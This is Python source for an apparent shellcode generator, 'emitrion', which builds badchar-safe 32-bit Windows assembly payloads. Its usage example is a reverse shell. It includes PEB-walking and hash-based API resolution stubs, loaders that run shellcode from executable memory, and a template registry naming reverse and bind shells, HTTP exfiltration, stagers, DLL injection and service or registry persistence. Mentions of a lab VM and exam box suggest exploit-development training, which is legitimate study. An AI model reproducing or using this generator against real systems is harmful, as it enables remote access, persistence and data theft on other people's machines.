"""Assembly build pipeline: manifest -> generated.asm + generated_contract.md.

Usage:
    uv run emitrion emitrion/manifests/revshell.yaml \
        --lhost 192.168.1.116 --lport 9001 --out emitter_out/
"""
from __future__ import annotations

import argparse
import os
import pathlib
import re
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from datetime import UTC, datetime

from emitrion.strings import emit_push, to_dwords

from .api_database import API_DATABASE, MODULE_LOAD_ORDER, STRUCT_DATABASE
from .api_emitter import emit_module_resolution
from .doc_gen import emit_full_contract_md
from .payload_templates.base import PayloadTemplate, TemplateConfig
from .schema import Manifest, StringEntry, VariableEntry
from .schema import load as load_manifest
from .stack_alloc import StackLayout, build_layout
from .string_emitter import emit_all_strings
from .structure_emitter import emit_all_structures


def _build_timestamp() -> str:
    """Return a build timestamp. Reproducible by default (epoch 0).

    Set SOURCE_DATE_EPOCH to a Unix timestamp for a specific date,
    or SOURCE_DATE_EPOCH=now for a wall-clock timestamp.
    """
    epoch = os.environ.get("SOURCE_DATE_EPOCH", "0")
    if epoch.lower() == "now":
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    dt = datetime.fromtimestamp(int(epoch), tz=UTC)
    return dt.strftime("%Y-%m-%d %H:%M:%S")


# ---------------------------------------------------------------------------
# Framework stubs - PEB-walk and export-resolution routines.
#
# Layout is null-free: callees are placed before callers so that every
# `call` instruction uses a negative (backward) relative offset whose
# upper bytes are 0xFF, never 0x00.  The entry point uses a two-hop
# `jmp short` trampoline (1-byte offset, inherently null-free) to skip
# past the stubs and reach `main`.
# ---------------------------------------------------------------------------

def _emit_framework_stubs_part1a(badchars: set[int]) -> str:
    """Generate Part 1a stubs (PEB walk + kernel32 find) with badchar-safe encoding.

    Must fit within 127 bytes of a jmp short from _start.
    """
    from .encode import (
        _disp_has_badchar,
        safe_cmp_word,
        safe_mem_load,
        safe_sub_imm,
    )
    lines: list[str] = []

    # get_first_ldr_entry: PEB -> Ldr -> InInitializationOrderModuleList
    lines.append("get_first_ldr_entry:")
    lines.append("    xor ecx, ecx")
    if not _disp_has_badchar(0x30, badchars):
        lines.append("    mov eax, fs:[ecx + 0x30]")
    else:
        from .encode import encode_dword
        lines.extend(encode_dword(0x30, badchars, "edx"))
        lines.append("    add edx, ecx")
        lines.append("    mov eax, fs:[edx]")
    lines.extend(safe_mem_load("eax", "eax", 0x0c, badchars, tmp="edx"))
    lines.extend(safe_mem_load("eax", "eax", 0x1c, badchars, tmp="edx"))
    lines.extend(safe_sub_imm("eax", 0x10, badchars, tmp="edx"))
    lines.append("    ret")
    lines.append("")

    # find_kernel32_entry: walk InInitOrder looking for KERNEL32.DLL
    lines.append("find_kernel32_entry:")
    lines.extend(safe_mem_load("esi", "eax", 0x30, badchars, tmp="edx"))
    lines.extend(safe_cmp_word("esi", 0, 0x004b, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_cmp_word("esi", 2, 0x0045, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_cmp_word("esi", 12, 0x0033, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_mem_load("ebx", "eax", 0x18, badchars, tmp="edx"))
    lines.append("    ret")
    lines.append("")

    # next: advance to next module in list
    lines.append("next:")
    lines.extend(safe_mem_load("eax", "eax", 0x10, badchars, tmp="edx"))
    lines.extend(safe_sub_imm("eax", 0x10, badchars, tmp="edx"))
    lines.append("    jmp find_kernel32_entry")

    return "\n".join(lines)


def _emit_framework_stubs_part1b(badchars: set[int]) -> str:
    """Generate Part 1b stubs (export directory/tables + save context).

    Placed after the first trampoline. find_module calls back into Part 1a.
    """
    from .encode import safe_mem_load, safe_mem_store
    lines: list[str] = []

    # find_module: entry point
    lines.append("find_module:")
    lines.append("    call get_first_ldr_entry")
    lines.append("    jmp find_kernel32_entry")
    lines.append("")

    # get_export_directory: PE header -> export directory RVA
    lines.append("get_export_directory:")
    lines.extend(safe_mem_load("eax", "ebx", 0x3c, badchars, tmp="edx"))
    lines.append("    add eax, ebx")
    lines.extend(safe_mem_load("eax", "eax", 0x78, badchars, tmp="edx"))
    lines.append("    add eax, ebx")
    lines.append("    ret")
    lines.append("")

    # get_export_tables: extract NumberOfNames, AddressOfNames, etc.
    lines.append("get_export_tables:")
    lines.extend(safe_mem_load("ecx", "eax", 0x18, badchars, tmp="edx"))
    lines.extend(safe_mem_load("edi", "eax", 0x20, badchars, tmp="edx"))
    lines.append("    add edi, ebx")
    lines.extend(safe_mem_load("edx", "eax", 0x24, badchars, tmp="ecx"))
    lines.append("    add edx, ebx")
    lines.extend(safe_mem_load("esi", "eax", 0x1c, badchars, tmp="ecx"))
    lines.append("    add esi, ebx")
    lines.append("    ret")
    lines.append("")

    # save_export_context: store to stack frame (negative offsets from ebp)
    lines.append("save_export_context:")
    lines.extend(safe_mem_store("ebp", -0x04, "ebx", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x08, "edi", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x0c, "edx", badchars, tmp="ecx"))
    lines.extend(safe_mem_store("ebp", -0x10, "esi", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x14, "ecx", badchars, tmp="edx"))
    lines.append("    ret")

    return "\n".join(lines)


def _emit_framework_stubs_part2(badchars: set[int]) -> str:
    """Generate Part 2 stubs (hash computation + export resolution) with badchar-safe encoding."""
    from .encode import safe_mem_load, safe_mem_store, safe_ror_imm
    lines: list[str] = []

    # compute_hash: ROR-13 hash of null-terminated string at ESI
    lines.append("compute_hash:")
    lines.append("    xor eax, eax")
    lines.append("    xor edx, edx")
    lines.append("    cld")
    lines.append("")
    lines.append("hash_loop:")
    lines.append("    lodsb")
    lines.append("    test al, al")
    lines.append("    jz hash_done")
    lines.extend(safe_ror_imm("edx", 0x0d, badchars))
    lines.append("    movzx eax, al")
    lines.append("    add edx, eax")
    lines.append("    jmp hash_loop")
    lines.append("")
    lines.append("hash_done:")
    lines.append("    ret")
    lines.append("")

    # resolve_matched_export: ordinal -> function address
    lines.append("resolve_matched_export:")
    lines.extend(safe_mem_load("edx", "ebp", -0x0c, badchars, tmp="eax"))
    lines.append("    movzx eax, word ptr [edx + ecx*2]")
    lines.extend(safe_mem_load("esi", "ebp", -0x10, badchars, tmp="edx"))
    lines.append("    mov eax, [esi + eax*4]")
    lines.extend(safe_mem_load("ecx", "ebp", -0x04, badchars, tmp="edx"))
    lines.append("    add eax, ecx")
    lines.append("    ret")
    lines.append("")

    # resolve_export_by_hash: loop through exports comparing hashes
    lines.append("resolve_export_by_hash:")
    lines.extend(safe_mem_store("ebp", -0x18, "eax", badchars, tmp="ecx"))
    lines.append("    xor ecx, ecx")
    lines.append("")
    lines.append("find_export_loop:")
    lines.extend(safe_mem_load("edi", "ebp", -0x08, badchars, tmp="eax"))
    lines.append("    mov eax, [edi + ecx*4]")
    lines.extend(safe_mem_load("edi", "ebp", -0x04, badchars, tmp="esi"))
    lines.append("    add eax, edi")
    lines.append("    mov esi, eax")
    lines.append("    call compute_hash")
    lines.extend(safe_mem_load("eax", "ebp", -0x18, badchars, tmp="edi"))
    # cmp opcode 0x3B may be a badchar; sub sets the same flags and uses 0x2B.
    if 0x3b in badchars:
        lines.append("    sub edx, eax")
    else:
        lines.append("    cmp edx, eax")
    lines.append("    je resolve_matched_export")
    lines.append("")
    lines.append("inc_next:")
    lines.append("    inc ecx")
    lines.extend(safe_mem_load("eax", "ebp", -0x14, badchars, tmp="edi"))
    # cmp ecx, eax would modify flags from ecx and then ecx is needed as the
    # loop counter.  Use edi as scratch to preserve ecx.
    if 0x3b in badchars:
        lines.append("    mov edi, ecx")
        lines.append("    sub edi, eax")
    else:
        lines.append("    cmp ecx, eax")
    lines.append("    jl find_export_loop")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Build result
# ---------------------------------------------------------------------------


@dataclass
class BuildResult:
    manifest_path: str
    asm: str
    contract_md: str
    shellcode_bytes: bytes | None = None
    hex_str: str | None = None
    py_bytes: str | None = None
    c_array: str | None = None
    test_harness: str | None = None
    debug_runner: str | None = None
    code_snippet: str | None = None
    layout: StackLayout | None = None
    assembler: str | None = None
    asm_errors: list[str] | None = None
    encoded_bytes: bytes | None = None
    encoder_report: str | None = None


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _emit_stack_reserve(frame_size: int, badchars: set[int]) -> list[str]:
    """Emit badchar-safe 'sub esp, <frame_size>' to reserve stack frame."""
    from .encode import encode_dword
    lines = list(encode_dword(frame_size, badchars, "ecx"))
    lines.append("    sub  esp, ecx")
    return lines


def _dll_load_block(dll: str, manifest: Manifest, layout: StackLayout) -> str:
    """Generate the LoadLibraryA block for a secondary DLL."""
    from .encode import safe_add_imm, safe_call_mem, safe_mem_load, safe_mem_store

    module_slot = layout.slot(dll)
    loadlib_off = -layout.slot("LoadLibraryA").offset
    module_off = -module_slot.offset

    push_result = emit_push(dll, badchars=manifest.badchars)
    cleanup = len(to_dwords(dll)) * 4
    bc = manifest.badchars

    lines = [
        f"; -- Loading {dll} via LoadLibraryA --",
        "",
        push_result.asm,
        f"    push esi                    ; lpLibFileName = &{dll}",
        *safe_call_mem("ebp", loadlib_off, bc),
        *safe_mem_store("ebp", module_off, "eax", bc),
        f"    ; {dll} base",
    ]
    lines.extend(safe_add_imm("esp", cleanup, bc, tmp="ecx"))
    lines.append("    ; pop string from stack")
    lines += [
        "",
        *safe_mem_load("ebx", "ebp", module_off, bc),
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]
    return "\n".join(lines)


def _generate_test_harness(shellcode_len: int) -> str:
    """Generate a standalone Python test harness for Windows x86 shellcode."""
    return f'''\
#!/usr/bin/env python3
"""Test harness for emitter-generated shellcode.

Copy this file and shellcode.bin to the Windows lab VM, then:
  python test_harness.py

Attach WinDbg before pressing Enter. The shellcode address is printed
so you can set a breakpoint:
  bp <address>
"""
import ctypes
import sys
from pathlib import Path

SHELLCODE_LEN = {shellcode_len}


def main():
    bin_path = Path(__file__).with_name("shellcode.bin")
    if not bin_path.exists():
        print(f"[-] {{bin_path}} not found", file=sys.stderr)
        sys.exit(1)

    shellcode = bytearray(bin_path.read_bytes())
    if len(shellcode) != SHELLCODE_LEN:
        print(
            f"[!] Expected {{SHELLCODE_LEN}} bytes, got {{len(shellcode)}}",
            file=sys.stderr,
        )

    kernel32 = ctypes.windll.kernel32

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Shellcode: {{len(shellcode)}} bytes")
    print(f"[+] Address:   {{ptr:#010x}}")
    print(f"[+] WinDbg:    bp {{ptr:#010x}}")
    print()
    input("... attach WinDbg, then press Enter to execute ...")

    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _generate_debug_runner(asm: str) -> str:
    """Generate a self-contained Python debug script with inline assembly.

    The script assembles the shellcode with keystone on the Windows lab VM,
    allocates RWX memory, prints the address for WinDbg, pauses, then
    executes. The assembly is embedded so it can be edited directly.
    """
    asm = asm.replace(";", "#")
    escaped_asm = asm.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
    return f'''\
#!/usr/bin/env python3
"""Debug runner for emitter-generated shellcode.

Copy this file to the Windows lab VM, then:
  python debug_runner.py

The assembly source is embedded below - edit it directly to experiment.
Requires: pip install keystone-engine

This runner assembles 32-bit x86 shellcode. Run it under 32-bit Python.
It allocates and copies the bytes before pausing for the debugger.
Attach WinDbg to this exact python.exe process before pressing Enter.
The allocation remains valid while this Python process is alive.
Use the printed address to set a breakpoint:
  bp <address>
"""
import ctypes
import sys

from keystone import KS_ARCH_X86, KS_MODE_32, Ks

CODE = r"""
{escaped_asm}
"""


def main():
    # Assemble the embedded text only. No shellcode has executed yet.
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    cleaned = CODE.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {{e}}", file=sys.stderr)
        print("[*] Scanning for the failing instruction...", file=sys.stderr)
        all_lines = cleaned.split("\\n")
        accum = []
        for i, ln in enumerate(all_lines):
            accum.append(ln)
            try:
                ks.asm("\\n".join(accum))
            except Exception:
                print(f"    line {{i+1}}: {{ln.strip()!r}}", file=sys.stderr)
                accum.pop()
        sys.exit(1)

    shellcode = bytearray(encoding)

    kernel32 = ctypes.windll.kernel32

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    # Reserve and commit executable memory in this Python process.
    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    # Copy the assembled bytes before the debugger attach window opens.
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Instructions: {{count}}")
    print(f"[+] Shellcode:    {{len(shellcode)}} bytes")
    print(f"[+] Address:      {{ptr:#010x}}")
    print(f"[+] WinDbg:       bp {{ptr:#010x}}")
    print()
    print(f'shellcode = b"' + "".join(f"\\\\x{{b:02x}}" for b in shellcode) + '"')
    print()
    # Do not continue until WinDbg is attached to this python.exe instance.
    input("... attach WinDbg, then press Enter to execute ...")

    # Start a new thread at the first byte of the copied shellcode.
    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _generate_code_snippet(asm: str) -> str:
    """Generate a standalone Python script with Keystone-compatible assembly.

    The script contains the assembly as CODE = r\"\"\"...\"\"\" and can:
    1. Assemble it with Keystone and run the shellcode (default)
    2. Output raw hex with --hex
    3. Output Python bytes with --py
    4. Write a .bin file with --bin FILE
    """
    ks_asm = _to_keystone(asm)
    ks_asm = ks_asm.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
    return f'''\
#!/usr/bin/env python3
"""Keystone-compatible assembly snippet from the emitter.

Usage on the exam box:
  python code_snippet.py              # assemble + run (attach WinDbg first)
  python code_snippet.py --hex        # print raw hex string
  python code_snippet.py --py         # print Python bytes literal
  python code_snippet.py --bin sc.bin # write raw binary file

Requires: pip install keystone-engine
"""
import argparse
import ctypes
import sys

try:
    from keystone import KS_ARCH_X86, KS_MODE_32, Ks
except ImportError:
    print("[-] keystone-engine not installed.", file=sys.stderr)
    print("    pip install keystone-engine", file=sys.stderr)
    sys.exit(1)

CODE = r"""
{ks_asm}
"""


def assemble(code: str) -> bytes:
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(code)
    print(f"[+] Assembled {{count}} instructions, {{len(encoding)}} bytes", file=sys.stderr)
    return bytes(encoding)


def main():
    parser = argparse.ArgumentParser(description="Assemble and optionally run shellcode")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--hex", action="store_true", help="Print hex string to stdout")
    group.add_argument("--py", action="store_true", help="Print Python bytes literal")
    group.add_argument("--bin", metavar="FILE", help="Write raw binary to FILE")
    group.add_argument("--run", action="store_true", default=True, help="Assemble and run (default)")
    args = parser.parse_args()

    try:
        shellcode = assemble(CODE)
    except Exception as e:
        print(f"[-] Assembly failed: {{e}}", file=sys.stderr)
        sys.exit(1)

    if args.hex:
        print("".join(f"\\\\x{{b:02x}}" for b in shellcode))
        return

    if args.py:
        chunks = [shellcode[i:i + 16] for i in range(0, len(shellcode), 16)]
        lines = ['b"' + "".join(f"\\\\x{{b:02x}}" for b in c) + '"' for c in chunks]
        print(f"shellcode = (\\n" + "\\n".join(lines) + f"\\n)\\n# Length: {{len(shellcode)}} bytes")
        return

    if args.bin:
        with open(args.bin, "wb") as f:
            f.write(shellcode)
        print(f"[+] Wrote {{len(shellcode)}} bytes to {{args.bin}}")
        return

    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    buf = (ctypes.c_char * len(shellcode)).from_buffer(bytearray(shellcode))
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Shellcode: {{len(shellcode)}} bytes")
    print(f"[+] Address:   {{ptr:#010x}}")
    print(f"[+] WinDbg:    bp {{ptr:#010x}}")
    print()
    input("... attach WinDbg, then press Enter to execute ...")

    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _bytes_to_hex_str(raw: bytes) -> str:
    chunks = [raw[i:i + 16] for i in range(0, len(raw), 16)]
    return "\n".join("".join(f"\\x{b:02x}" for b in chunk) for chunk in chunks)


def _bytes_to_py(raw: bytes) -> str:
    chunks = [raw[i:i + 16] for i in range(0, len(raw), 16)]
    lines = [f'b"{"".join(f"\\x{b:02x}" for b in chunk)}"' for chunk in chunks]
    body = "\n".join(lines)
    return f"shellcode = (\n{body}\n)\n# Length: {len(raw)} bytes"


def _bytes_to_c(raw: bytes) -> str:
    hex_bytes = [f"0x{b:02x}" for b in raw]
    rows = [hex_bytes[i:i + 16] for i in range(0, len(hex_bytes), 16)]
    body = "\n".join("    " + ", ".join(row) + "," for row in rows)
    return f"unsigned char shellcode[] = {{\n{body}\n}};\n// Length: {len(raw)} bytes"


def _write_text(path: pathlib.Path, data: str) -> None:
    """Write text files as UTF-8 regardless of the host locale."""
    path.write_text(data, encoding="utf-8")


def _strip_comments(asm: str) -> str:
    """Strip both # and ; comments so non-ASCII decoration never reaches the assembler."""
    lines = []
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = line.split(";")[0]
        lines.append(line)
    return "\n".join(lines)


def _to_keystone(asm: str) -> str:
    """Convert emitter Intel syntax to Keystone-compatible syntax.

    Keystone already accepts the emitter's internal format with minimal
    changes:
    - Strip # and ; comments
    - 'jmp short' -> 'jmp' (Keystone infers short encoding)
    - Drop blank-only lines (Keystone chokes on trailing whitespace lines)
    """
    lines = []
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = line.split(";")[0]
        line = line.rstrip()
        line = re.sub(r'\bjmp\s+short\b', 'jmp', line)
        if line.strip():
            lines.append(line)
    return "\n".join(lines)


def _to_nasm(asm: str) -> str:
    """Convert emitter Intel syntax to nasm flat-binary syntax.

    Differences handled:
    - Prepend 'BITS 32' so nasm knows the mode
    - Strip # and ; comments (may contain non-ASCII decoration)
    - 'dword/word/byte ptr [...]' -> 'dword/word/byte [...]'
    - 'fs:[...]' -> '[fs:...]'  (segment register syntax)
    """
    lines = ["BITS 32"]
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = line.split(";")[0]
        line = line.rstrip()
        line = re.sub(r'\bfs:\[', '[fs:', line)
        line = re.sub(r'\b(dword|word|byte)\s+ptr\b', r'\1', line, flags=re.IGNORECASE)
        lines.append(line)
    return "\n".join(lines)


def _try_assemble_keystone(asm: str) -> tuple[bytes | None, str | None]:
    """Try keystone. Returns (bytes, None) on success or (None, error_msg)."""
    try:
        import keystone
    except ImportError:
        return None, None
    try:
        ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
        encoding, _ = ks.asm(_strip_comments(asm))
        return bytes(encoding), None
    except Exception as e:
        return None, f"keystone: {e}"


def _try_assemble_nasm(asm: str) -> tuple[bytes | None, str | None]:
    """Try nasm. Returns (bytes, None) on success or (None, error_msg)."""
    if not shutil.which("nasm"):
        return None, None
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            src = pathlib.Path(tmpdir) / "shellcode.asm"
            out = pathlib.Path(tmpdir) / "shellcode.bin"
            _write_text(src, _to_nasm(asm))
            result = subprocess.run(
                ["nasm", "-f", "bin", "-o", str(out), str(src)],
                capture_output=True,
                text=True,
            )
            if result.returncode != 0:
                return None, f"nasm: {result.stderr.strip()}"
            return out.read_bytes(), None
    except Exception as e:
        return None, f"nasm: {e}"


def _check_badchars(raw: bytes, badchars: set[int]) -> list[str]:
    """Scan assembled shellcode for badchar violations. Returns error messages."""
    violations: list[str] = []
    for i, byte in enumerate(raw):
        if byte in badchars:
            ctx_start = max(0, i - 2)
            ctx_end = min(len(raw), i + 3)
            ctx = raw[ctx_start:ctx_end].hex()
            violations.append(
                f"BADCHAR 0x{byte:02x} at offset {i} (context: {ctx})"
            )
    if violations:
        summary = f"[!] {len(violations)} badchar violation(s) in {len(raw)} bytes"
        return [summary] + violations
    return []


def _try_assemble(asm: str) -> tuple[bytes, str, list[str]] | tuple[None, None, list[str]]:
    """Try keystone, then nasm. Returns (bytes, assembler_name, errors) or (None, None, errors)."""
    errors: list[str] = []
    raw, err = _try_assemble_keystone(asm)
    if raw is not None:
        return raw, "keystone", errors
    if err:
        errors.append(err)
    raw, err = _try_assemble_nasm(asm)
    if raw is not None:
        return raw, "nasm", errors
    if err:
        errors.append(err)
    return None, None, errors


def _call_disp_has_badchar(raw: bytes, badchars: set[int]) -> bool:
    """Return True if any CALL rel32 displacement byte is in badchars."""
    for i in range(len(raw) - 4):
        if raw[i] == 0xe8:
            if any(raw[i + k] in badchars for k in range(1, 5)):
                return True
    return False


def _assemble_aligned(
    asm: str, badchars: set[int], max_nops: int = 64,
) -> tuple[bytes | None, str | None, str, list[str]]:
    """Try assembling with 0..max_nops alignment NOPs before main.

    CALL rel32 displacement bytes can land on a forbidden value purely due to
    code layout.  Adding NOP instructions before main shifts every caller in
    main by one byte without moving the callee labels, changing all
    relative displacements by exactly one, so a small linear search finds the
    first clean count.

    Only call-displacement bytes are checked here; content badchars (literal
    bytes in the payload) are handled separately by build().

    Returns (bytes, assembler_name, asm_with_nops, errors).
    """
    _PLACEHOLDER = "; __ALIGNMENT_NOPS__"
    for n in range(max_nops + 1):
        nops = "\n".join("    nop" for _ in range(n)) if n > 0 else ""
        candidate = asm.replace(_PLACEHOLDER, nops, 1)
        raw, assembler, errs = _try_assemble(candidate)
        if raw is None:
            return None, None, candidate, errs
        if not _call_disp_has_badchar(raw, badchars):
            return raw, assembler, candidate, []
    return raw, assembler, candidate, []


def _validate_badchars(raw: bytes, badchars: set[int]) -> list[str]:
    """Return diagnostics when assembled bytes contain forbidden values."""
    hits = [(offset, byte) for offset, byte in enumerate(raw) if byte in badchars]
    if not hits:
        return []

    preview = ", ".join(f"0x{offset:04x}=0x{byte:02x}" for offset, byte in hits[:8])
    suffix = "" if len(hits) <= 8 else f" ... ({len(hits)} total)"
    return [f"assembled shellcode contains forbidden bytes: {preview}{suffix}"]


def _load_template(name: str) -> PayloadTemplate:
    """Load a payload template by short name."""
    registry = {
        "reverse_shell":  "emitrion.payload_templates.reverse_shell.ReverseShellTemplate",
        "run_command":    "emitrion.payload_templates.run_command.RunCommandTemplate",
        "copy_file":      "emitrion.payload_templates.copy_file.CopyFileTemplate",
        "copy_then_run":  "emitrion.payload_templates.copy_then_run.CopyThenRunTemplate",
        "move_then_run":  "emitrion.payload_templates.move_then_run.MoveThenRunTemplate",
        "tcp_download":   "emitrion.payload_templates.tcp_download.TcpDownloadTemplate",
        "tcp_stager":     "emitrion.payload_templates.tcp_stager.TcpStagerTemplate",
        "bind_shell":     "emitrion.payload_templates.bind_shell.BindShellTemplate",
        "http_download":  "emitrion.payload_templates.http_download.HttpDownloadTemplate",
        "http_exfil":     "emitrion.payload_templates.http_exfil.HttpExfilTemplate",
        "process_replace": "emitrion.payload_templates.process_replace.ProcessReplaceTemplate",
        "service_persist": "emitrion.payload_templates.service_persist.ServicePersistTemplate",
        "dll_inject":      "emitrion.payload_templates.dll_inject.DllInjectTemplate",
        "registry_persist": "emitrion.payload_templates.registry_persist.RegistryPersistTemplate",
        "check_path":      "emitrion.payload_templates.check_path.CheckPathTemplate",
        "get_username":    "emitrion.payload_templates.get_username.GetUsernameTemplate",
        "download_to_userpath": "emitrion.payload_templates.download_to_userpath.DownloadToUserpathTemplate",
        "tcp_download_to_userpath": "emitrion.payload_templates.tcp_download_to_userpath.TcpDownloadToUserpathTemplate",
        "ir_run_command":  "emitrion.workflow.reference.IRRunCommandTemplate",
        "ir_reverse_shell": "emitrion.workflow.reference.IRReverseShellTemplate",
    }
    if name not in registry:
        raise ValueError(
            f"Unknown template: '{name}'. Available: {sorted(registry.keys())}"
        )
    module_path, cls_name = registry[name].rsplit(".", 1)
    import importlib
    mod = importlib.import_module(module_path)
    cls = getattr(mod, cls_name)
    return cls()


# ---------------------------------------------------------------------------
# CLI override precedence
# ---------------------------------------------------------------------------

# Config field name -> manifest string label(s) it can override.
# A field may map to multiple labels (e.g. service_name applies to both
# the "service_name" label in service_persist and "reg_value_name" in
# registry_persist).
_CONFIG_TO_LABELS: dict[str, list[str]] = {
    "command": ["cmd"],
    "src_path": ["src_path"],
    "dst_path": ["dst_path", "check_path"],
    "url": ["url"],
    "url_path": ["url_path"],
    "lhost": ["exfil_host"],
    "process_name": ["process_name"],
    "service_name": ["service_name", "reg_value_name"],
}


def _apply_config_overrides(manifest: Manifest, config: TemplateConfig) -> Manifest:
    """Apply non-None config overrides to manifest strings, then backfill
    any still-None config fields from the manifest.

    Must run before build_layout() because changed string lengths affect
    slot sizes.  Mutates config in place (backfill) and returns a new
    Manifest when any string value changed.
    """
    label_to_field: dict[str, str] = {}
    for field_name, labels in _CONFIG_TO_LABELS.items():
        for label in labels:
            label_to_field[label] = field_name

    overrides: dict[str, str] = {}
    for field_name, labels in _CONFIG_TO_LABELS.items():
        val = getattr(config, field_name)
        if val is not None:
            for label in labels:
                overrides[label] = val

    changed = False
    new_strings: list[StringEntry] = []
    for entry in manifest.strings:
        if entry.label in overrides and overrides[entry.label] != entry.value:
            new_strings.append(StringEntry(
                label=entry.label,
                value=overrides[entry.label],
                method=entry.method,
                dest=entry.dest,
            ))
            changed = True
        else:
            new_strings.append(entry)

    # Backfill config from manifest for fields still None
    for entry in new_strings:
        field_name = label_to_field.get(entry.label)
        if field_name is not None and getattr(config, field_name) is None:
            setattr(config, field_name, entry.value)

    # Final fallbacks for fields with no manifest string
    if config.command is None:
        config.command = "cmd.exe"
    if config.src_path is None:
        config.src_path = "C:\\source.txt"
    if config.dst_path is None:
        config.dst_path = "C:\\dest.txt"
    if config.url is None:
        config.url = f"http://{config.lhost}:{config.lport}/payload.exe"
    if config.url_path is None:
        config.url_path = "/exfil"
    if config.process_name is None:
        config.process_name = "target.exe"
    if config.service_name is None:
        config.service_name = "UpdateSvc"

    if not changed:
        return manifest

    return Manifest(
        badchars=manifest.badchars,
        functions=list(manifest.functions),
        strings=new_strings,
        variables=list(manifest.variables),
        template=manifest.template,
    )


# ---------------------------------------------------------------------------
# Auto-derive template requirements
# ---------------------------------------------------------------------------


def _merge_template_requirements(
    manifest: Manifest,
    template: PayloadTemplate,
    config: TemplateConfig,
) -> Manifest:
    """Probe the template to discover slot references, then return a new
    Manifest with any missing API functions auto-added.

    Classification of each probed slot name:
      - In API_DATABASE         -> function (auto-add if missing)
      - In STRUCT_DATABASE      -> structure (auto-derived from functions)
      - In MODULE_LOAD_ORDER    -> module base (auto-derived from functions)
      - Matches a manifest string label or variable -> already present
      - Otherwise               -> ignored (optional probe or manifest error)

    Variables are not auto-added because the probe cannot distinguish
    required variables from optional slot lookups guarded by try/except.
    Variables must be declared in the manifest YAML.

    Non-kernel32 functions trigger automatic addition of LoadLibraryA.
    """
    probed = template.probe_slots(config)

    existing_funcs = set(manifest.functions)
    existing_vars = {v.name for v in manifest.variables}
    string_labels = {e.label for e in manifest.strings}
    dll_names = {m.dll for m in MODULE_LOAD_ORDER}

    new_funcs: list[str] = []
    new_vars: list[VariableEntry] = []
    new_strings: list[StringEntry] = []

    # WorkflowTemplate declares requirements precisely; unknown names
    # are IR-defined locals that need variable slots.
    from emitrion.workflow.reference import WorkflowTemplate
    auto_add_vars = isinstance(template, WorkflowTemplate)

    # Auto-add strings from IR ConstructString declarations
    if auto_add_vars:
        ir_strings = template.probe_strings()
        for label, value in ir_strings.items():
            if label not in string_labels:
                new_strings.append(StringEntry(
                    label=label, value=value, method="push",
                ))
                string_labels.add(label)

    ir_struct_names: set[str] = set()
    if auto_add_vars:
